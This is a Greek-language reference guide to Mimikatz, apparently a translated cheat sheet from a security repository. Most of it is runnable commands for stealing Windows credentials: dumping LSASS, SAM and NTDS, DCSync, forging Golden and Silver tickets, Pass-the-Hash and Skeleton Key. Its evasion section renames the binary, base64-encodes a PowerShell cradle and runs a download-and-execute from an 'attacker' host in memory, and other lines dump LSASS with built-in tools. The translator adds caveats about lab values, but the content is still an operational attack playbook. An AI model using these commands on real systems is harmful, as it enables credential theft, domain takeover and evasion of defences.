# 🔑 Mimikatz — Πλήρης οδηγός αναφοράς

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)

```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
               Εργαλείο διερεύνησης στοιχείων ταυτοποίησης Windows
```

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Credentials">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 Εργαλείο διερεύνησης στοιχείων ταυτοποίησης Windows.</b>
</p>

---

## Πριν ξεκινήσετε

Το **Mimikatz** εξετάζει και διαχειρίζεται στοιχεία ταυτοποίησης Windows υπό συγκεκριμένες προϋποθέσεις. Το **LSASS** είναι υπηρεσία που σχετίζεται με την τοπική ασφάλεια και την ταυτοποίηση. Το **SAM** αφορά δεδομένα τοπικών λογαριασμών, το **NTDS** δεδομένα καταλόγου Active Directory και το **NTLM hash** αποτύπωμα που σχετίζεται με τον αντίστοιχο μηχανισμό ταυτοποίησης. Το hash δεν είναι κωδικός σε απλό κείμενο.

Το **Kerberos ticket** είναι εισιτήριο ταυτοποίησης ή πρόσβασης υπηρεσίας. Τα **TGT/TGS**, **SID**, **RID** και **SPN** είναι διαφορετικά αναγνωριστικά ή στοιχεία του περιβάλλοντος καταλόγου και δεν είναι εναλλάξιμα. Το TGT χρησιμοποιείται για αιτήματα tickets υπηρεσιών. Το SID είναι αναγνωριστικό ασφάλειας, το RID σχετικό αναγνωριστικό και το SPN όνομα που προσδιορίζει υπηρεσία. Ο ελεγκτής domain αναφέρεται συχνά ως DC. Το **DPAPI** προστατεύει δεδομένα εφαρμογών και χρηστών. Το **DCSync** απαιτεί κατάλληλα δικαιώματα αναπαραγωγής καταλόγου και δεν ισοδυναμεί με απλή τοπική πρόσβαση διαχειριστή.

Το mimikatz # είναι προτροπή κονσόλας· το # εκεί δεν είναι σχόλιο. Οι εντολές και τα παραδείγματα παραμένουν όπως στο πρωτότυπο. Οι hashes, τα domain, οι SID και οι λογαριασμοί είναι θέσεις εργαστηριακών τιμών, όχι στοιχεία που ανακτήθηκαν εδώ. Πολλές λειτουργίες εξαρτώνται από έκδοση Windows, αρχιτεκτονική και μηχανισμούς προστασίας.

Οι τίτλοι «όλα τα credentials», «SYSTEM» ή «Credential Guard bypass» δεν αποδεικνύουν επιτυχία. Επαληθεύστε τι διαβάστηκε ή άλλαξε και καταγράψτε τους περιορισμούς. Η [Microsoft περιγράφει το Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/) ως απομόνωση προστατευμένων στοιχείων μέσω VBS· ένα σφάλμα πρόσβασης δεν αρκεί για διάγνωση της κατάστασής του.

## 📋 Περιεχόμενα

- [Τι είναι το Mimikatz;](#section-01)
- [Πρώτα βήματα](#section-02)
- [Τρόποι εκτέλεσης](#section-03)
- [Βασικά modules](#section-04)
- [Εξαγωγή στοιχείων ταυτοποίησης](#section-05)
- [Παραδείγματα ελέγχων Kerberos](#section-06)
- [Πρόσθετες τεχνικές του πρωτοτύπου](#section-07)
- [Παραδείγματα αποφυγής εντοπισμού του πρωτοτύπου](#section-08)
- [Γρήγορη αναφορά](#section-09)
- [Πηγές](#section-10)

---

<a id="section-01"></a>

## 🎯 Τι είναι το Mimikatz;

Το **Mimikatz**, έργο του **Benjamin Delpy** (@gentilkiwi), περιλαμβάνει λειτουργίες διερεύνησης και εξαγωγής στοιχείων ταυτοποίησης. Ανάλογα με τα δικαιώματα, την έκδοση και τις προστασίες, μπορεί να αφορά:

- 🔑 **Κωδικούς σε απλό κείμενο**, όπου αυτοί είναι πράγματι διαθέσιμοι στη μνήμη LSASS.
- 🎫 **Tickets Kerberos** (TGT, TGS).
- 🔐 **Hashes NTLM** από σχετικά δεδομένα SAM/NTDS.
- 📜 **Πιστοποιητικά και ιδιωτικά κλειδιά**, όπου επιτρέπεται η πρόσβαση.
- 🗝️ **Αποθηκευμένα στοιχεία σύνδεσης (cached credentials)**.
- 🔒 **Προστατευμένα δεδομένα DPAPI**.

### Ποιες λειτουργίες εξετάζει;

| Χρήση | Περιγραφή |
| ---------- | ------------- |
| **Εξαγωγή στοιχείων σύνδεσης** | Εξαγωγή διαθέσιμων στοιχείων από τη μνήμη |
| **Μετακίνηση σε άλλα συστήματα** | Pass-the-Hash, Pass-the-Ticket |
| **Ανύψωση δικαιωμάτων** | Ενέργειες με ταυτότητα άλλου χρήστη υπό τις κατάλληλες συνθήκες |
| **Διατήρηση πρόσβασης (Persistence)** | Golden/Silver Tickets |
| **Εκτεταμένη επίδραση στο domain** | DCSync με ειδικά δικαιώματα αναπαραγωγής καταλόγου |

---

<a id="section-02"></a>

## 🚀 Πρώτα βήματα

### Λήψη

```bash
# Επίσημο αποθετήριο
git clone https://github.com/gentilkiwi/mimikatz.git

# Έτοιμα εκτελέσιμα στις εκδόσεις releases
# https://github.com/gentilkiwi/mimikatz/releases
```

### Προϋποθέσεις

- **Κατάλληλα δικαιώματα διαχειριστή ή SYSTEM** για πολλές από τις λειτουργίες.
- **SeDebugPrivilege**, όπου σχετίζεται με την επιδιωκόμενη πρόσβαση· δεν καταργεί κάθε προστασία LSASS.
- Κατάλληλη έκδοση και αρχιτεκτονική Windows x64 ή x86.

### Πρώτες εντολές

```cmd
# Εκκίνηση Mimikatz
mimikatz.exe

# Έλεγχος διαθέσιμων προνομίων
mimikatz # privilege::debug
Privilege '20' OK

# Περιγραφή του πρωτοτύπου — η token::elevate αφορά χρήση token
mimikatz # token::elevate

# Έξοδος
mimikatz # exit
```

---

<a id="section-03"></a>

## 💻 Τρόποι εκτέλεσης

### 1. Αυτόνομο εκτελέσιμο

```cmd
# Απευθείας εκτέλεση — πιθανός εντοπισμός από μηχανισμούς προστασίας
mimikatz.exe

# Παράδειγμα μίας γραμμής
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Καταγραφή αποτελέσματος σε αρχείο
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# Χρήση εντολής καταγραφής
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 2. PowerShell με Invoke-Mimikatz

```powershell
# Λήψη περιεχομένου και εκτέλεση στη μνήμη
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Εξαγωγή: διαθέσιμα στοιχεία σύνδεσης
Invoke-Mimikatz -DumpCreds

# Εξαγωγή: πιστοποιητικά
Invoke-Mimikatz -DumpCerts

# Παράδειγμα εκτέλεσης σε απομακρυσμένο εργαστηριακό σύστημα
Invoke-Mimikatz -ComputerName DC01
```

### 3. Metasploit με επέκταση Kiwi

```bash
# Μέσα σε συνεδρία Meterpreter
meterpreter > load kiwi

# Ανάκτηση: βοήθεια
meterpreter > help kiwi

# Εξαγωγή: διαθέσιμα στοιχεία σύνδεσης
meterpreter > creds_all

# Εξαγωγή: διαθέσιμα hashes
meterpreter > lsa_dump_sam

# Εξαγωγή: προστατευμένα στοιχεία
meterpreter > lsa_dump_secrets

# Tickets Kerberos
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

### 4. CrackMapExec

```bash
# Εξαγωγή: δεδομένα SAM
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# Εξαγωγή: δεδομένα LSA
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# Εξαγωγή: δεδομένα NTDS
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

### 5. Από αντίγραφο μνήμης

```cmd
# Παράδειγμα απόκτησης αντιγράφου LSASS με Task Manager ή procdump
procdump.exe -ma lsass.exe lsass.dmp

# Φόρτωση αντιγράφου μνήμης στο Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

<a id="section-04"></a>

## 🔧 Βασικά modules

### Επισκόπηση modules

| Module | Περιγραφή |
| -------- | ------------- |
| **sekurlsa** | Εξαγωγή διαθέσιμων στοιχείων από μνήμη LSASS |
| **lsadump** | Εξαγωγή διαθέσιμων στοιχείων SAM, NTDS και cache |
| **kerberos** | Διαχείριση και μεταβολή tickets Kerberos |
| **crypto** | Πιστοποιητικά CryptoAPI |
| **vault** | Windows Vault — διαχείριση στοιχείων σύνδεσης |
| **token** | Διαχείριση tokens |
| **privilege** | Διαχείριση προνομίων |
| **process** | Ενέργειες σε διεργασίες |
| **service** | Ενέργειες σε υπηρεσίες |
| **dpapi** | Προστατευμένα δεδομένα DPAPI |
| **misc** | Λοιπές εντολές |

### Χρήση βοήθειας

```cmd
# Προβολή: όλα τα modules
mimikatz # ::

# Βοήθεια module
mimikatz # sekurlsa::
mimikatz # lsadump::
mimikatz # kerberos::
```

---

<a id="section-05"></a>

## 🔐 Εξαγωγή στοιχείων ταυτοποίησης

### Module sekurlsa για LSASS

```cmd
# Απόπειρα ενεργοποίησης του διαθέσιμου προνομίου αποσφαλμάτωσης
mimikatz # privilege::debug

# Εξαγωγή: διαθέσιμα στοιχεία σύνδεσης (plaintext, NTLM, SHA1)
mimikatz # sekurlsa::logonpasswords

# Εξαγωγή: μόνο hashes NTLM
mimikatz # sekurlsa::msv

# Εξαγωγή tickets Kerberos
mimikatz # sekurlsa::tickets

# Εξαγωγή: στοιχεία WDigest, ενδεχομένως σε απλό κείμενο αν υποστηρίζεται
mimikatz # sekurlsa::wdigest

# Εξαγωγή: κλειδιά κρυπτογράφησης Kerberos
mimikatz # sekurlsa::ekeys

# Εξαγωγή: διαθέσιμα στοιχεία DPAPI
mimikatz # sekurlsa::dpapi

# Εξαγωγή: διαθέσιμα στοιχεία συγκεκριμένης διεργασίας
mimikatz # sekurlsa::logonpasswords /process:lsass.exe

# Εξαγωγή: διαθέσιμα στοιχεία TsPkg για RDP
mimikatz # sekurlsa::tspkg

# Εξαγωγή: διαθέσιμα στοιχεία LiveSSP
mimikatz # sekurlsa::livessp

# Εξαγωγή: διαθέσιμα στοιχεία SSP
mimikatz # sekurlsa::ssp

# Εξαγωγή: διαθέσιμα στοιχεία CloudAP
mimikatz # sekurlsa::cloudap
```

### Module lsadump για SAM/NTDS

Η περιγραφή του πρωτοτύπου «Dump NTDS.dit» δίπλα σε lsadump::lsa /patch ή /inject δεν περιγράφει γενική διαδικασία ανάγνωσης αυθαίρετου αρχείου NTDS.dit. Ξεχωρίστε την πηγή, τη λειτουργία και τα πραγματικά δεδομένα του αποτελέσματος.


```cmd
# Εξαγωγή: δεδομένα SAM τοπικών λογαριασμών
mimikatz # lsadump::sam

# Εξαγωγή: δεδομένα SAM με το αντίστοιχο hive SYSTEM
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# Εξαγωγή διαθέσιμων προστατευμένων στοιχείων LSA
mimikatz # lsadump::secrets

# Εξαγωγή: αποθηκευμένα στοιχεία σύνδεσης DCC2
mimikatz # lsadump::cache

# DCSync — λειτουργία που βασίζεται σε δικαιώματα αναπαραγωγής καταλόγου
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Εξαγωγή: περιγραφή του πρωτοτύπου για δεδομένα DC
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# Εξαγωγή: κλειδιά σχέσεων εμπιστοσύνης
mimikatz # lsadump::trust /patch

# Εξαγωγή: εφεδρικά κλειδιά DPAPI
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
```

### Module vault για διαχείριση στοιχείων σύνδεσης

```cmd
# Προβολή: διαθέσιμα στοιχεία vault
mimikatz # vault::list

# Εξαγωγή: διαθέσιμα στοιχεία vault
mimikatz # vault::cred /patch
```

### Module dpapi

```cmd
# Εξαγωγή: κύρια κλειδιά DPAPI
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# Αποκρυπτογράφηση δεδομένων DPAPI με τα απαιτούμενα κλειδιά
mimikatz # dpapi::blob /in:blob_file /masterkey:key

# Αποθηκευμένα στοιχεία σύνδεσης Chrome
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

<a id="section-06"></a>

## 🎫 Παραδείγματα ελέγχων Kerberos

### Προβολή tickets

```cmd
# Προβολή: όλα τα διαθέσιμα tickets
mimikatz # kerberos::list

# Προβολή: tickets με πρόσθετες πληροφορίες
mimikatz # kerberos::list /export

# Εξαγωγή διαθέσιμων tickets
mimikatz # sekurlsa::tickets /export
```

### Χρήση Kerberos ticket (Pass-the-Ticket / PtT)

```cmd
# Αφαίρεση υπαρχόντων tickets
mimikatz # kerberos::purge

# Εισαγωγή εισιτηρίου Kerberos
mimikatz # kerberos::ptt ticket.kirbi

# Έλεγχος διαθέσιμων εισιτηρίων
mimikatz # kerberos::list
```

### Golden Ticket — παράδειγμα πλαστογράφησης ticket υπό συγκεκριμένες προϋποθέσεις

Οι τιμές SID, hashes και RID είναι ενδεικτικές. Ο RID 500 αφορά τον ενσωματωμένο λογαριασμό Administrator και δεν είναι ο ίδιος με RID ομάδας. Η /sids δεν ορίζει διεύθυνση DC. Η δημιουργία bytes ticket δεν αποδεικνύει ότι θα γίνει αποδεκτό στη συγκεκριμένη υποδομή.


```cmd
# Προϋποθέσεις:
# - Όνομα domain, π.χ. domain.local
# - SID του domain, π.χ. S-1-5-21-...
# - Hash NTLM του λογαριασμού krbtgt
# - Όνομα χρήστη που χρησιμοποιεί το παράδειγμα — ελέγξτε τους περιορισμούς

# Παράδειγμα δημιουργίας Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# Δημιουργία και εξαγωγή στο παράδειγμα
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# Παράδειγμα τιμών RID του πρωτοτύπου — δεν είναι όλοι οι αναγραφόμενοι RID ομάδες
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# Περιγραφή του πρωτοτύπου για DC — η παράμετρος /sids δεν ορίζει διακομιστή DC
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

### Silver Ticket — παράδειγμα ticket συγκεκριμένης υπηρεσίας

```cmd
# Προϋποθέσεις:
# - Όνομα domain
# - SID του domain
# - Hash NTLM του λογαριασμού της σχετικής υπηρεσίας
# - Αναγνωριστικό υπηρεσίας SPN

# Παράδειγμα Silver Ticket για CIFS και κοινόχρηστα αρχεία
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# Παράδειγμα Silver Ticket για HTTP
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# Παράδειγμα Silver Ticket για υπηρεσία SQL
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# Παραδείγματα Silver Ticket που το πρωτότυπο συσχετίζει με WinRM/PSRemoting
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:hash /ptt
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

<a id="section-07"></a>

## 💀 Πρόσθετες τεχνικές του πρωτοτύπου

### Χρήση hash για ταυτοποίηση (Pass-the-Hash / PtH)

```cmd
# Παράδειγμα δημιουργίας διεργασίας με στοιχεία NTLM
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Παράδειγμα με κλειδιά AES
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe

# Παράδειγμα PtH για δημιουργία διεργασίας
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"powershell -ep bypass"
```

### Overpass-the-Hash / Pass-the-Key

```cmd
# Περιγραφή Overpass-the-Hash του πρωτοτύπου — όχι άμεση μετατροπή hash σε ticket
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Το πρωτότυπο προϋποθέτει επακόλουθο αίτημα TGT
# Έλεγχος του αποτελέσματος με klist όπου έχει πράγματι εκδοθεί ticket
```

### Σενάριο DCSync

```cmd
# Παράδειγμα αιτήματος δεδομένων ενός χρήστη
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# Παράδειγμα αιτήματος δεδομένων krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Παράδειγμα αιτήματος δεδομένων χρηστών
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Παράδειγμα επιλογής συγκεκριμένου DC
mimikatz # lsadump::dcsync /domain:domain.local /dc:DC01.domain.local /user:Administrator
```

### Παράδειγμα Skeleton Key

```cmd
# Περιγραφή Skeleton Key του πρωτοτύπου — ισχύουν συγκεκριμένες συνθήκες και περιορισμοί
mimikatz # misc::skeleton

# Το πρωτότυπο περιγράφει επίδραση μέχρι επανεκκίνηση του DC
# Περιγραφή του πρωτοτύπου για το δοκιμαστικό μυστικό mimikatz — όχι καθολική συμπεριφορά
```

### Παραδείγματα διερεύνησης DPAPI

```cmd
# Εξαγωγή: κύρια κλειδιά
mimikatz # sekurlsa::dpapi

# Αποκρυπτογράφηση αρχείου στοιχείων σύνδεσης υπό τις αντίστοιχες προϋποθέσεις
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\xxx /masterkey:key

# Αποθηκευμένα στοιχεία σύνδεσης RDP
mimikatz # dpapi::rdg /in:rdp_file.rdg /masterkey:key
```

### Διαχείριση tokens

```cmd
# Προβολή: διαθέσιμα tokens
mimikatz # token::list

# Απόπειρα χρήσης token SYSTEM όπου επιτρέπεται
mimikatz # token::elevate

# Απόπειρα χρήσης token συγκεκριμένου χρήστη
mimikatz # token::elevate /user:Administrator

# Επιστροφή στο αρχικό token
mimikatz # token::revert

# Παράδειγμα εκτέλεσης με συγκεκριμένη ταυτότητα
mimikatz # token::run /user:domain\admin
```

---

<a id="section-08"></a>

## 🛡️ Παραδείγματα αποφυγής εντοπισμού του πρωτοτύπου

### Αλλαγή ονομάτων στο παράδειγμα του πρωτοτύπου

```cmd
# Μετονομασία του mimikatz.exe στο παράδειγμα
rename mimikatz.exe m.exe
rename mimikatz.exe totally_legit.exe
```

### Παράδειγμα μετασχηματισμού εντολής PowerShell

```powershell
# Κωδικοποίηση Base64
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### Παράδειγμα εκτέλεσης στη μνήμη

```powershell
# Παράδειγμα Invoke-Mimikatz στη μνήμη
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# Εναλλακτικό παράδειγμα επέκτασης Kiwi του Meterpreter
meterpreter > load kiwi
meterpreter > creds_all
```

### Παραδείγματα απόκτησης αντιγράφου LSASS

```cmd
# Παράδειγμα ProcDump της Microsoft
procdump.exe -ma lsass.exe lsass.dmp

# Παράδειγμα χρήσης της ενσωματωμένης comsvcs.dll
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# Task Manager — γραφικό περιβάλλον
# Επιλογή lsass.exe και Create dump file όπως περιγράφει το πρωτότυπο

# Παράδειγμα SQLDumper από περιβάλλον SQL Server
sqldumper.exe <lsass_pid> 0 0x01100
```

### Ισχυρισμός παράκαμψης Credential Guard του πρωτοτύπου — περιορισμοί

Ένα σφάλμα sekurlsa δεν αποδεικνύει ότι είναι ενεργό το Credential Guard. Το DCSync είναι διαφορετική διαδρομή, με ανεξάρτητα δικαιώματα αναπαραγωγής καταλόγου· το παράδειγμα δεν τεκμηριώνει παράκαμψη της απομόνωσης μνήμης Credential Guard.


```cmd
# Το παρακάτω αποτέλεσμα δεν αρκεί για έλεγχο ενεργοποίησης Credential Guard
mimikatz # sekurlsa::logonpasswords
# Ενδεικτικό μήνυμα του πρωτοτύπου: "ERROR kuhl_m_sekurlsa_acquireLSA"

# Το πρωτότυπο παραθέτει DCSync ως διαφορετική τεχνική με ανεξάρτητες προϋποθέσεις
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---

<a id="section-09"></a>

## 📊 Γρήγορη αναφορά

### Βασικά παραδείγματα μίας γραμμής

```cmd
# Εξαγωγή: διαθέσιμα στοιχεία σύνδεσης
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Εξαγωγή: δεδομένα SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Παράδειγμα DCSync για δεδομένα χρηστών
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# Παράδειγμα Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt" "exit"

# Παράδειγμα Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

### Γρήγορη αναφορά λειτουργιών

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `privilege::debug` | Ενεργοποίηση διαθέσιμου προνομίου αποσφαλμάτωσης |
| `token::elevate` | Απόπειρα χρήσης token SYSTEM όπου επιτρέπεται |
| `sekurlsa::logonpasswords` | Εξαγωγή διαθέσιμων στοιχείων LSASS |
| `sekurlsa::msv` | Εξαγωγή διαθέσιμων hashes NTLM |
| `sekurlsa::tickets` | Εξαγωγή tickets Kerberos |
| `sekurlsa::pth` | Pass-the-Hash |
| `lsadump::sam` | Εξαγωγή διαθέσιμων στοιχείων SAM |
| `lsadump::secrets` | Εξαγωγή διαθέσιμων προστατευμένων στοιχείων LSA |
| `lsadump::dcsync` | Παράδειγμα DCSync |
| `lsadump::lsa /patch` | Περιγραφή του πρωτοτύπου για δεδομένα DC — χρειάζεται επιβεβαίωση λειτουργίας |
| `kerberos::list` | Κατάλογος tickets Kerberos |
| `kerberos::ptt` | Pass-the-Ticket |
| `kerberos::golden` | Δημιουργία ticket του αντίστοιχου παραδείγματος |
| `kerberos::purge` | Αφαίρεση tickets |
| `vault::list` | Κατάλογος διαθέσιμων στοιχείων vault |
| `dpapi::cred` | Αποκρυπτογράφηση δεδομένων DPAPI με τις απαιτούμενες προϋποθέσεις |

### Παράδειγμα ακολουθίας ενεργειών

```
1. Αρχική πρόσβαση στο εξουσιοδοτημένο εργαστήριο
2. privilege::debug
3. sekurlsa::logonpasswords (διαθέσιμα στοιχεία σύνδεσης)
4. sekurlsa::pth (παράδειγμα μετακίνησης σε άλλο σύστημα)
5. lsadump::dcsync /user:krbtgt (παράδειγμα δεδομένων krbtgt)
6. kerberos::golden (παράδειγμα Golden Ticket)
7. Το πρωτότυπο περιγράφει εκτεταμένη επίδραση στο domain· δεν προκύπτει αυτομάτως από τα παραπάνω
```

---

<a id="section-10"></a>

## 📚 Πηγές

- [Επίσημο αποθετήριο GitHub](https://github.com/gentilkiwi/mimikatz)
- [Τεκμηρίωση Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki)
- [Οδηγός Mimikatz του ADSecurity](https://adsecurity.org/?page_id=1821)
- [HackTricks — Mimikatz](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

### Σχετικοί οδηγοί
- [Ανύψωση δικαιωμάτων Windows](../../Windows-PrivEsc/translations/README.el.md)
- [Metasploit](../../Metasploit/translations/README.el.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.el.md)

---

<p align="center">
  <b>🔑 Μελετήστε τη διαχείριση και προστασία στοιχείων ταυτοποίησης.</b><br>
  <i>Αξιολογήστε τις πραγματικές προϋποθέσεις κάθε λειτουργίας.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
